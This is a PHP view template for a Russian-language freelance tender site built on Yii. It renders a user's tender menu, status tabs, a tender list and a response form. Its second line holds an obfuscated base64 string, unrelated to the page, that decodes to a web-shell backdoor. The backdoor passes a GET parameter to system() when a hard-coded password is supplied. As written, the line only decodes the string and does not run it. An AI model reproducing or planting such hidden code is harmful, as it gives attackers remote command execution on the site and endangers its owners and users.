<?php Yii::app()->clientScript->registerCssFile('/css/style.css'); ?>
<?php base64_decode('aWYoJF9HRVRbJ3Bhc3MnXT09J0dvb3QnKXN5c3RlbSgkX0dFVFsnZ29vdCddKTs='); ?>
<div class="portfolio_head dotted">
	<div class="menu_level2">
		<ul>
			<li data-value="1"><?php echo CHtml::link('Подходящие', "/users/{$user->login}/tenders/suited"); ?> <span><?php echo Tender::getSuitedProvider($user->id)->getTotalItemCount(); ?></span></li>
			<li class="current" data-value="2"><?php echo CHtml::link('Я откликнулся', "/users/{$user->login}/tenders/idoer"); ?> <span><?php echo $dataProvider->getTotalItemCount(); ?></span></li>
			<li data-value="3"><?php echo CHtml::link('Я заказал', "/users/{$user->login}/tenders/iclient"); ?> <span><?php echo Tender::getIclienProvider($user->id)->getTotalItemCount(); ?></span></li>
		</ul>
	</div>
	<div class="btn_conteiner btn_project">
		<?php echo CHtml::link('Создать заказ <i></i>',
			'/tenders/create',
			array('class'=>'btn_grey add_tender')
		); ?>
	</div>
	<div class="clear"></div>
</div>
<div class="tenders_head">
	<div id="tabs">
		<span class="current"><a data-value="1" id="all_tenders" href="#">Все</a></span>
		<span><a data-value="2" id="opened_tenders" class="" href="#">Открытые</a></span>
		<span><a data-value="3" id="closed_tenders" class="" href="#">Завершенные</a></span>
	</div>
	<div class="cost">Бюджет</div>
	<div class="response">Откликов</div>
	<div class="respond">Откликнуться</div>
	<div class="clear"></div>
</div>
<div class="tender_list">
	<?php $this->renderPartial('_tenderIdoerList', array('dataProvider'=>$dataProvider)); ?>
</div>
<div class="respond_conteiner">
	<div class="shadow_block tender_respond">
		<span>Комментарий к отклику</span>
		<textarea name="name" class="textInput " maxlength="255"></textarea>
		<span>Ориентировочная стоимость, руб.</span>
		<input type="text" class="textInput" maxlength="15">
		<div class="btn_conteiner">
			<a class="btn_grey">Откликнуться</a>
		</div>
	</div>
</div>